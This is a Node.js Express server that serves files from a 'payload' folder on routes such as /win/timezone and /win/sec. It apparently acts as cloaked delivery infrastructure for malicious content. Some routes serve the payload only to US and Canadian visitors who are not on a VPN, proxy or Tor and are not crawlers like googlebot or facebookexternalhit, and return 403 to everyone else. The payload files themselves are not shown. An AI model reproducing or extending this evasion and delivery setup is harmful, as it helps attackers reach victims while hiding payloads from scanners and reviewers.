import express from "express";
import useragent from "express-useragent";
import cors from "cors";
import fs from "fs";
import path from "path";
import expressDefender from "express-defender";
import { clientInfoMiddleware } from "securize";

const app = express();

// ----- Trust proxy (REQUIRED if behind Cloudflare / Nginx / any proxy) -----
app.set("trust proxy", true);

app.use(express.json());
app.use(useragent.express());
app.use(cors());

// ----- Country filter: only US and Canada -----
app.use(
  expressDefender({
    allowedCountries: ["US", "CA"],
    allowedBots: [/Googlebot/], // optional: let real search engine crawlers through
  })
);

// ----- Client info: VPN / Proxy / Tor detection -----
app.use(clientInfoMiddleware);

// ----- Config -----
const BOT_AGENTS = [
  "facebookexternalhit",
  "facebot",
  "googlebot",
  "bingbot",
  "crawler",
  "spider",
  "bot",
];

const ALLOWED_COUNTRIES = ["US", "CA"];

// ----- Runtime stats & logs -----
const stats = { allowed: 0, blockedBots: 0, blockedVpn: 0, blockedCountry: 0 };
const recentLogs = [];
const MAX_LOGS = 500;

function pushLog(entry) {
  recentLogs.unshift(entry);
  if (recentLogs.length > MAX_LOGS) recentLogs.pop();

  console.log(
    `[${entry.ts}] ${entry.ip} -> ${entry.route} : ${entry.result.toUpperCase()} (${entry.reason})`
  );
  if (entry.details && Object.keys(entry.details).length) {
    console.log("   Details:", entry.details);
  }
}

// ----- Helpers -----
function clientIP(req) {
  const xf = req.headers["x-forwarded-for"];
  return xf ? xf.split(",")[0].trim() : req.ip;
}

function uaIsBot(ua = "") {
  if (!ua) return true;
  const low = ua.toLowerCase();
  return BOT_AGENTS.some((b) => low.includes(b));
}

// ✅ Validate: country + VPN/Tor + bot
function validateRequest(req) {
  const info = req.clientInfo || {};

  // 1. VPN / Proxy / Tor block
  if (info.isProxy || info.isTor) {
    return {
      allowed: false,
      reason: "vpn_or_tor_blocked",
      details: { isProxy: !!info.isProxy, isTor: !!info.isTor },
    };
  }

  // 2. Country check (double-check in case express-defender passed something through)
  const country = req.headers["cf-ipcountry"] || info.country || null;
  if (country && !ALLOWED_COUNTRIES.includes(country.toUpperCase())) {
    return {
      allowed: false,
      reason: "country_not_allowed",
      details: { country },
    };
  }

  // 3. Bot UA block
  const ua = req.useragent?.source || req.get("User-Agent") || "";
  if (uaIsBot(ua)) {
    return {
      allowed: false,
      reason: "blocked_bot",
      details: { userAgent: ua },
    };
  }

  return {
    allowed: true,
    reason: "allowed_us_ca_real_ip",
    details: { country: country || "unknown" },
  };
}

// ----- Load payloads -----
function loadPayload(filename) {
  const p = path.join(process.cwd(), "payload", filename);
  try {
    return fs.readFileSync(p, "utf8");
  } catch (err) {
    console.error(`Failed to load payload ${filename}:`, err.message);
    return "";
  }
}

const timezonePayload = loadPayload("timezone.txt");
const secPayload = loadPayload("sec.txt");

// ----- Validated handler -----
function validatedHandler(payloadString) {
  return (req, res) => {
    // ✅ Full validation (country + VPN + bot)
    const check = validateRequest(req);

    pushLog({
      ts: new Date().toISOString(),
      ip: clientIP(req),
      route: req.path,
      result: check.allowed ? "allowed" : "blocked",
      reason: check.reason,
      details: check.details || {},
    });

    if (!check.allowed) {
      if (check.reason === "vpn_or_tor_blocked") stats.blockedVpn++;
      else if (check.reason === "country_not_allowed") stats.blockedCountry++;
      else stats.blockedBots++;

      return res.status(403).json({
        status: "blocked",
        reason: check.reason,
      });
    }

    stats.allowed++;
    return res.status(200).type("text/html").send(payloadString);
  };
}

// ----- Unchecked handler -----
function uncheckedHandler(payloadString) {
  return (req, res) => {
    pushLog({
      ts: new Date().toISOString(),
      ip: clientIP(req),
      route: req.path,
      result: "allowed",
      reason: "unrestricted_route",
      details: {},
    });

    res.status(200).type("text/html").send(payloadString);
  };
}

// ----- Routes -----
app.all("/win/timezone", validatedHandler(timezonePayload));
app.all("/win/sec", uncheckedHandler(secPayload));

app.all("/timezone", validatedHandler(timezonePayload));
app.all("/security", uncheckedHandler(secPayload));

app.all("*", (req, res) => {
  pushLog({
    ts: new Date().toISOString(),
    ip: clientIP(req),
    route: req.path,
    result: "not_found",
    reason: "no_matching_route",
    details: {},
  });
  res.status(404).json({ error: "Not found" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server listening on port ${PORT}`);
  console.log(`🌍 Allowed countries: ${ALLOWED_COUNTRIES.join(", ")}`);
  console.log(`🛡️  VPN / Tor / Proxy blocking: ENABLED`);
});